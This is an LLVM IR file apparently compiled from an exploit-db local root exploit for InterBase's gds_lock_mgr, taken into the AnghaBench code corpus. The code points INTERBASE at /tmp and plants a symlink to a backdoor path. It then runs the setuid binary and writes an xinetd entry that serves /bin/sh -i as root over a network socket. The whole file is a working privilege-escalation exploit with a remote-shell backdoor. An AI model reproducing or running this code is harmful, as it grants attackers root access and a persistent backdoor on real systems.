; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_21865.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_21865.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.utsname = type { i32 }

@.str = private unnamed_addr constant [127 x i8] c"service xinetdbd\0A{\0Adisable = no\0Aprotocol = 666\0Asocket_type = stream\0Await = no\0Auser = root\0Aserver = /bin/sh\0Aserver_args = -i\0A}\0A\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [50 x i8] c"*** gds_lock_mgr local root exploit - grazer ***\0A\00", align 1
@.str.2 = private unnamed_addr constant [10 x i8] c"INTERBASE\00", align 1
@.str.3 = private unnamed_addr constant [5 x i8] c"/tmp\00", align 1
@.str.4 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.5 = private unnamed_addr constant [16 x i8] c"/tmp/isc_init1.\00", align 1
@.str.6 = private unnamed_addr constant [12 x i8] c"ln %s -s %s\00", align 1
@BDPATH = common dso_local global i8* null, align 8
@GDSBIN = common dso_local global i8* null, align 8
@.str.7 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [17 x i8] c"%s not found...\0A\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c"w\00", align 1
@.str.10 = private unnamed_addr constant [28 x i8] c"     exploit succesfull...\0A\00", align 1
@.str.11 = private unnamed_addr constant [19 x i8] c"exploit failed...\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca %struct.utsname, align 4
  %2 = alloca [24 x i8], align 16
  %3 = alloca [34 x i8], align 16
  %4 = alloca i32*, align 8
  %5 = alloca i8*, align 8
  store i8* getelementptr inbounds ([127 x i8], [127 x i8]* @.str, i64 0, i64 0), i8** %5, align 8
  %6 = load i32, i32* @stdout, align 4
  %7 = call i32 (i32, i8*, ...) @fprintf(i32 %6, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.1, i64 0, i64 0))
  %8 = call i32 @uname(%struct.utsname* %1)
  %9 = call i32 @setenv(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0), i32 1)
  %10 = getelementptr inbounds [24 x i8], [24 x i8]* %2, i64 0, i64 0
  %11 = call i32 (i8*, i8*, i8*, ...) @sprintf(i8* %10, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.5, i64 0, i64 0))
  %12 = getelementptr inbounds [24 x i8], [24 x i8]* %2, i64 0, i64 0
  %13 = getelementptr inbounds %struct.utsname, %struct.utsname* %1, i32 0, i32 0
  %14 = load i32, i32* %13, align 4
  %15 = call i32 @strcat(i8* %12, i32 %14)
  %16 = call i32 @chdir(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0))
  %17 = call i32 @umask(i32 0)
  %18 = getelementptr inbounds [34 x i8], [34 x i8]* %3, i64 0, i64 0
  %19 = load i8*, i8** @BDPATH, align 8
  %20 = getelementptr inbounds [24 x i8], [24 x i8]* %2, i64 0, i64 0
  %21 = call i32 (i8*, i8*, i8*, ...) @sprintf(i8* %18, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.6, i64 0, i64 0), i8* %19, i8* %20)
  %22 = getelementptr inbounds [34 x i8], [34 x i8]* %3, i64 0, i64 0
  %23 = call i32 @system(i8* %22)
  %24 = load i8*, i8** @GDSBIN, align 8
  %25 = call i32* @fopen(i8* %24, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.7, i64 0, i64 0))
  store i32* %25, i32** %4, align 8
  %26 = icmp ne i32* %25, null
  br i1 %26, label %27, label %32

27:                                               ; preds = %0
  %28 = load i8*, i8** @GDSBIN, align 8
  %29 = call i32 @system(i8* %28)
  %30 = load i32*, i32** %4, align 8
  %31 = call i32 @close(i32* %30)
  br label %37

32:                                               ; preds = %0
  %33 = load i32, i32* @stderr, align 4
  %34 = load i8*, i8** @GDSBIN, align 8
  %35 = call i32 (i32, i8*, ...) @fprintf(i32 %33, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.8, i64 0, i64 0), i8* %34)
  %36 = call i32 @exit(i32 0) #3
  unreachable

37:                                               ; preds = %27
  %38 = load i8*, i8** @BDPATH, align 8
  %39 = call i32* @fopen(i8* %38, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0))
  store i32* %39, i32** %4, align 8
  %40 = icmp ne i32* %39, null
  br i1 %40, label %41, label %50

41:                                               ; preds = %37
  %42 = load i32, i32* @stderr, align 4
  %43 = call i32 (i32, i8*, ...) @fprintf(i32 %42, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.10, i64 0, i64 0))
  %44 = load i32*, i32** %4, align 8
  %45 = ptrtoint i32* %44 to i32
  %46 = load i8*, i8** %5, align 8
  %47 = call i32 (i32, i8*, ...) @fprintf(i32 %45, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i8* %46)
  %48 = load i32*, i32** %4, align 8
  %49 = call i32 @close(i32* %48)
  br label %54

50:                                               ; preds = %37
  %51 = load i32, i32* @stderr, align 4
  %52 = call i32 (i32, i8*, ...) @fprintf(i32 %51, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.11, i64 0, i64 0))
  %53 = call i32 @exit(i32 0) #3
  unreachable

54:                                               ; preds = %41
  ret i32 0
}

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @uname(%struct.utsname*) #1

declare dso_local i32 @setenv(i8*, i8*, i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*, ...) #1

declare dso_local i32 @strcat(i8*, i32) #1

declare dso_local i32 @chdir(i8*) #1

declare dso_local i32 @umask(i32) #1

declare dso_local i32 @system(i8*) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @close(i32*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
